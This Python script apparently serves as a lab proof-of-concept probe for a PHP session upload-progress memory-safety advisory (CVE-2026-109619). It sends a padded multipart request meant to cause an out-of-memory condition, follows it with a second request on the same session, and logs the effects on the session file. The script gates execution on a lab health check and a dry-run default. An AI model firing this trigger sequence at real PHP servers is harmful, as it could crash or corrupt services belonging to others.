#!/usr/bin/env python3
"""Bounded local probe for the PHP session upload-progress lifecycle path.

The sequence is based on the official CVE-2026-109619 advisory.
"""

import argparse
from datetime import datetime, timezone
import hashlib
import http.client
from http.cookies import SimpleCookie
import json
from pathlib import Path
import secrets
import ssl
import time

from attacker import BOUNDARY, endpoint_path, parse_target


def part(name, value, *, filename=None):
    header = (f"--{BOUNDARY}\r\nContent-Disposition: form-data; name=\"{name}\"")
    if filename is not None:
        header += f'; filename="{filename}"'
    header += "\r\n"
    if filename is not None:
        header += "Content-Type: text/plain\r\n"
    return header.encode("ascii") + b"\r\n" + value + b"\r\n"


def multipart_producer(pad_bytes, control):
    progress = (part("PHP_SESSION_UPLOAD_PROGRESS", b"k")
                if control != "oom-no-progress" else b"")
    padding = (part("pad", b"x" * pad_bytes)
               if control != "small-file-no-oom" else b"")
    return (progress + part("u", b"x", filename="x.txt") + padding
            + f"--{BOUNDARY}--\r\n".encode("ascii"))


def multipart_consumer():
    return (part("PHP_SESSION_UPLOAD_PROGRESS", b"k")
            + f"--{BOUNDARY}--\r\n".encode("ascii"))


def request(scheme, host, port, method, path, *, body=None, cookie=None,
            timeout=15.0, ca_file=None, request_id=""):
    started = time.monotonic()
    connection = None
    try:
        headers = {"User-Agent": "php-session-progress-lab/1",
                   "X-CVE-Lab-Request": request_id}
        if body is not None:
            headers["Content-Type"] = f"multipart/form-data; boundary={BOUNDARY}"
        if cookie is not None:
            headers["Cookie"] = cookie
        if scheme == "https":
            context = ssl.create_default_context(cafile=ca_file)
            connection = http.client.HTTPSConnection(host, port, timeout=timeout, context=context)
        else:
            connection = http.client.HTTPConnection(host, port, timeout=timeout)
        connection.request(method, path, body=body, headers=headers)
        response = connection.getresponse()
        prefix = response.read(2049)
        result = {
            "http_status": response.status,
            "worker_pid_header": response.getheader("X-Lab-Worker-Pid"),
            "body_prefix": prefix[:2048].decode("utf-8", "replace"),
            "body_truncated": len(prefix) > 2048,
        }
        return result, response.getheader("Set-Cookie")
    except (OSError, ValueError, http.client.HTTPException) as exc:
        return {"transport_error": f"{type(exc).__name__}: {exc}"}, None
    finally:
        if connection is not None:
            connection.close()
        result = locals().get("result")
        if isinstance(result, dict):
            result["elapsed_ms"] = round((time.monotonic() - started) * 1000)


def session_file_state(seed, session_id):
    path = seed.get("session_path", "")
    if not path or ";" in path:
        return {"local_file": "unavailable"}
    session_file = Path(path) / ("sess_" + session_id)
    state = {}
    try:
        state["metadata_size"] = session_file.stat().st_size
    except OSError as exc:
        state["metadata_error"] = f"{type(exc).__name__}: {exc.strerror}"
    try:
        data = session_file.read_bytes()
        state.update({"local_file": "readable", "size": len(data),
                      "progress_key_present": b"upload_progress_k" in data,
                      "file_field_marker_present": b's:10:"field_name";s:1:"u"' in data,
                      "filename_marker_present": b's:4:"name";s:5:"x.txt"' in data,
                      "content_sha256": hashlib.sha256(data).hexdigest()})
    except (OSError, ValueError) as exc:
        state.update({"local_file": "unavailable",
                      "read_error": f"{type(exc).__name__}: {getattr(exc, 'strerror', str(exc))}"})
    return state


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True, help="Numeric loopback/private lab URL")
    parser.add_argument("--health", default="health.php")
    parser.add_argument("--seed", default="session-seed.php")
    parser.add_argument("--producer", default="oom/upload.php")
    parser.add_argument("--consumer", default="upload.php")
    parser.add_argument("--pad-bytes", type=int, default=6 * 1024 * 1024)
    parser.add_argument("--producer-control",
                        choices=("candidate", "small-file-no-oom", "oom-no-progress"),
                        default="candidate",
                        help="Choose a single-factor control for the A request")
    parser.add_argument("--expected-php", default="8.5.11")
    parser.add_argument("--timeout", type=float, default=15.0)
    parser.add_argument("--ca-file", type=Path)
    parser.add_argument("--report", type=Path)
    parser.add_argument("--skip-producer", action="store_true",
                        help="Consumer-only control in a fresh worker")
    parser.add_argument("--execute", action="store_true")
    args = parser.parse_args()
    if not 1 <= args.pad_bytes <= 7 * 1024 * 1024:
        parser.error("--pad-bytes must be 1..7340032")
    if not 0.5 <= args.timeout <= 60:
        parser.error("--timeout must be 0.5..60")
    if args.ca_file and not args.ca_file.is_file():
        parser.error("--ca-file does not exist")
    scheme, host, port, prefix = parse_target(args.target)
    paths = {key: endpoint_path(prefix, getattr(args, key))
             for key in ("health", "seed", "producer", "consumer")}
    producer_body = multipart_producer(args.pad_bytes, args.producer_control)
    consumer_body = multipart_consumer()
    run_id = secrets.token_hex(8)
    report = {
        "tool": "session upload-progress lifecycle diagnostic",
        "observed_at_utc": datetime.now(timezone.utc).isoformat(),
        "run_id": run_id,
        "target": args.target,
        "expected_php": args.expected_php,
        "paths": paths,
        "executed": args.execute,
        "candidate_attempted": False,
        "control": "consumer_only" if args.skip_producer else "producer_then_consumer",
        "producer_control": args.producer_control,
        "verdict": "not_determined; no memory-safety conclusion from HTTP alone",
        "producer_body_bytes": len(producer_body),
        "producer_body_sha256": hashlib.sha256(producer_body).hexdigest(),
        "consumer_body_bytes": len(consumer_body),
        "consumer_body_sha256": hashlib.sha256(consumer_body).hexdigest(),
        "steps": [],
    }
    output = args.report or Path.cwd() / f"session-progress-{run_id}.json"
    if output.exists() and args.execute:
        parser.error(f"report already exists: {output}")
    if not args.execute:
        print(json.dumps(report, ensure_ascii=False, indent=2))
        return
    if not output.parent.is_dir():
        parser.error("report directory does not exist")

    def save():
        temporary = output.with_name(output.name + ".tmp")
        temporary.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n",
                             encoding="utf-8")
        temporary.replace(output)

    save()
    def run(name, method, body=None, cookie=None):
        result, set_cookie = request(scheme, host, port, method, paths[name],
                                     body=body, cookie=cookie, timeout=args.timeout,
                                     ca_file=str(args.ca_file) if args.ca_file else None,
                                     request_id=f"{run_id}-{name}")
        report["steps"].append({"step": name, "method": method,
                                "path": paths[name], "result": result})
        save()
        return result, set_cookie

    baseline, _ = run("health", "GET")
    try:
        health = json.loads(baseline.get("body_prefix", ""))
    except json.JSONDecodeError:
        health = {}
    if (baseline.get("http_status") != 200 or
            health.get("lab") != "official-cve-lab-v1" or
            health.get("php") != args.expected_php or
            health.get("sapi") != "apache2handler" or
            str(health.get("upload_progress")) not in ("1", "On")):
        report["preflight_failure"] = "health/version/SAPI/upload-progress mismatch"
        save()
        print(output)
        return
    seed_response, set_cookie = run("seed", "GET")
    try:
        seed = json.loads(seed_response.get("body_prefix", ""))
    except json.JSONDecodeError:
        seed = {}
    cookie = SimpleCookie()
    if set_cookie:
        cookie.load(set_cookie)
    session_name = seed.get("session_name")
    if not seed.get("seeded") or not session_name or session_name not in cookie:
        report["preflight_failure"] = "valid session cookie was not issued"
        save()
        print(output)
        return
    if any(str(seed.get(name)) != "1" for name in
           ("upload_progress_enabled", "upload_progress_cleanup",
            "use_only_cookies", "use_strict_mode")):
        report["preflight_failure"] = "session progress/cookie/strict/cleanup settings must be enabled"
        save()
        print(output)
        return
    session_id = cookie[session_name].value
    report["session"] = {
        "id_sha256": hashlib.sha256(session_id.encode("ascii")).hexdigest(),
        "seed": seed,
        "before_producer": session_file_state(seed, session_id),
    }
    cookie_header = f"{session_name}={session_id}"
    if not args.skip_producer:
        report["candidate_attempted"] = True
        save()
        run("producer", "POST", producer_body, cookie_header)
        report["session"]["after_producer"] = session_file_state(seed, session_id)
        save()
    run("consumer", "POST", consumer_body, cookie_header)
    report["session"]["after_consumer"] = session_file_state(seed, session_id)
    save()
    print(output)


if __name__ == "__main__":
    main()
